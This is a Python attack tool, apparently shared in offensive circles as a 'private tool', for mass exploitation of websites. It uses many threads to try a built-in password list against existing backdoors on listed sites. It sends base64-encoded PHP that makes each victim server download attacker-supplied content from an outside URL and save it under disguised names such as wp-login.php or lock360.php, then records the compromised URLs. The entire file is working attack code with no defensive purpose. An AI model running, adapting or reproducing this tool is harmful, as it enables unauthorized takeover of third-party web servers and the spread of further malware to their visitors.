import sys
import requests
import base64
import string
import random
from multiprocessing.dummy import Pool
from colorama import Fore, init

init(autoreset=True)
#Xday_Priv8
# Color definitions
fr = Fore.RED
fg = Fore.GREEN

banner = '''{}         
[#] Create By ::

                             Xday Private Tool
                          https://t.me/Xday_Priv8
\n'''.format(fr)
print(banner)

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

try:
    fileToUploadContent = sys.argv[2]
    url_list_file = sys.argv[1]
except IndexError:
    print("\nUsage: python file.py list.txt")
    sys.exit(1)

resultFile = 'Results.txt'

# List of possible file names
fileNames = ['radio.php', 'content.php', 'lock360.php', 'admin.php', 'wp-login.php']

passwords = '''
e115ea764553c3989bdb01afb29e6136
caedcc170541362068afbe4d87c6ff09
e59f4d639448c0f5e352b97bc62e693c
0d07cd22fe4a3aa77b55f72e1430ecc6
b6c7de8ef032f11bf657d88c899ac6c3
85c3cb3731c8c9196c099f670a12232a
84a46e354acfbdaef66fea141370fcab
bf374f59a55d6bf8694c2a040b2025ff
71cab91fe1492eb2f143743d1d051798
037e7eecc9d6bf09688e7b3a19002712
f8f8aa7dfdbb1bae345654762a97fac8
65382b91dadd987df578c91c621451d1
14cfa37223314c1e1cba979266304e31
72d3a41c963c23d9f0477e7006890982
55127f6c031c6aa82b612297a85b0e72
c55aec5d4a2184892eb126cd0e4823c8
4e3854b3ba742254b82b1023e9d6ee67
9d7add0ea58f74d16ec5d5294ad4881f
d94f094a3e502592cef2494d2703be52
02107239421d26a347ef64bb0ea54156
fe7ac1d4f188c32e9730443197289af5
7e6e70c4a23f1ef293fdc181c2e58e02
d94f094a3e502592cef2494d2703be52
365d45b687ceea852bbe0a833ff1c6d2
04d134878af3142c15cb359e14314685
'''

try:
    urls = filter(None, [i.strip() for i in open(url_list_file, mode='r').readlines()])
except Exception as e:
    print("Error opening file:", e)
    sys.exit(1)

passwords = filter(None, [i.strip() for i in passwords.splitlines()])

Headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36',
}


def read_file(file_name):
    with open(file_name, 'r') as file:
        return file.read()


def generate_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))


def b64(inp):
    str_bytes = inp.encode('ascii')
    base64_bytes = base64.b64encode(str_bytes)
    return base64_bytes.decode('ascii')


def ResultUrl(url, filename):
    schemPart = url.split("://")
    dirs = schemPart[1].split('/')
    dirs.pop()
    dirs.append(filename)
    return schemPart[0] + '://' + "/".join(dirs)


def SendRequest(url, password, fileName):
    Params = {
        'pwd163': password,
        'zzz': b64('file_put_contents("' + fileName + '", file_get_contents("' + fileToUploadContent + '")); echo "GOOD";')
    }
    try:
        res = requests.post(url, params=Params, headers=Headers, verify=False, timeout=60)
        check = res.text
        res.close()
        if 'GOOD' in check:
            return True
    except Exception as err:
        pass
    return False


class Worker:
    def __init__(self):
        return

    def work(self, url):
        good = False
        for password in passwords:
            if good:
                continue
            # Selecting a random file name from the list
            fileName = random.choice(fileNames)
            if SendRequest(url, password, fileName):
                print('[GOOD] ' + ResultUrl(url, fileName))
                with open(resultFile, 'a') as f:
                    f.write(ResultUrl(url, fileName) + '\n')
                good = True
        if not good:
            print('[BAD] ' + url)


worker = Worker()


def runWorker(url):
    try:
        worker.work(url)
    except:
        pass


mp = Pool(40)
mp.map(runWorker, urls)
mp.close()
mp.join()
